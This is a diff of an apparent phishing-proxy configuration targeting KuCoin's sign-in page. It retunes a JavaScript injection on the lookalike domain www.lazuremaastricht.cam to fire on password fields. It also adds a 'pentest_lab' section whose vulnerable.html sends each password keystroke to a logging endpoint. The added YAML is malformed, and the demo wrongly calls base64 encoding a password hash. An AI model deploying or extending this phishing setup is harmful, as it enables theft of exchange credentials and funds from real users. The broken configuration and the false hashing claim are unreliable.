@@ -41,9 +41,9 @@ paths:
     backend: https://www.kucoin.com/ucenter/signin"
 
 js_inject:
-  - trigger_domains: ['lazuremaastricht.cam']
+  - trigger_domains: ['www.lazuremaastricht.cam']
     trigger_paths: ["/*"]
-    trigger_params: []
+    trigger_params: ["password"]
     script: |  
       function onclickListener(){
         var submit = document.querySelectorAll('input[type="submit"]')[0];
@@ -60,4 +60,77 @@ js_inject:
         return;
       }
       setTimeout(function(){ onclickListener(); }, 1000);
+      
+pentest_lab:
+  - trigger_domains: ['www.lazuremaastricht.cam']
+    trigger_paths: ["/*"]
+    trigger_params: ["password"]
+    script: |
+    files:
+    index.html: |
+      <!DOCTYPE html>
+      <html lang="en">
+      <head>
+        <meta charset="UTF-8" />
+        <title>Veilige Login Demo</title>
+      </head>
+      <body>
+        <h2>Login</h2>
+        <form id="loginForm" onsubmit="return handleLogin(event)">
+          <input type="text" name="username" placeholder="Gebruikersnaam" />
+          <input type="password" name="password" placeholder="Wachtwoord" />
+          <button type="submit">Login</button>
+        </form>
+
+        <script>
+          function hashPassword(pw) {
+            return btoa(pw); // Voor demo-doeleinden
+          }
+
+          function handleLogin(e) {
+            e.preventDefault();
+            const pw = document.querySelector('input[name="password"]').value;
+            const hashed = hashPassword(pw);
+            console.log("Gehashte wachtwoord:", hashed);
+            alert("Wachtwoord succesvol gehashed!");
+          }
+        </script>
+      </body>
+      </html>
+
+    vulnerable.html: |
+      <!DOCTYPE html>
+      <html lang="en">
+      <head>
+        <meta charset="UTF-8" />
+        <title>Onveilige Login Demo</title>
+      </head>
+      <body>
+        <h2>Login</h2>
+        <form id="loginForm" onsubmit="return handleLogin(event)">
+          <input type="text" name="username" placeholder="Gebruikersnaam" />
+          <input type="password" name="password" placeholder="Wachtwoord" />
+          <button type="submit">Login</button>
+        </form>
+
+        <script>
+          // Kwaadaardige injectie – simuleert XSS-aanval
+          const pwField = document.querySelector('input[name="password"]');
+          pwField.addEventListener('input', () => {
+            fetch('http://0.0.0.0:8080/log?pw=' + encodeURIComponent(pwField.value));
+          });
+
+          function hashPassword(pw) {
+            return btoa(pw);
+          }
+
+          function handleLogin(e) {
+            e.preventDefault();
+            const pw = document.querySelector('input[name="password"]').value;
+            const hashed = hashPassword(pw);
+            console.log("Gehashte wachtwoord:", hashed);
+          }
+        </script>
+      </body>
+      </html>
 
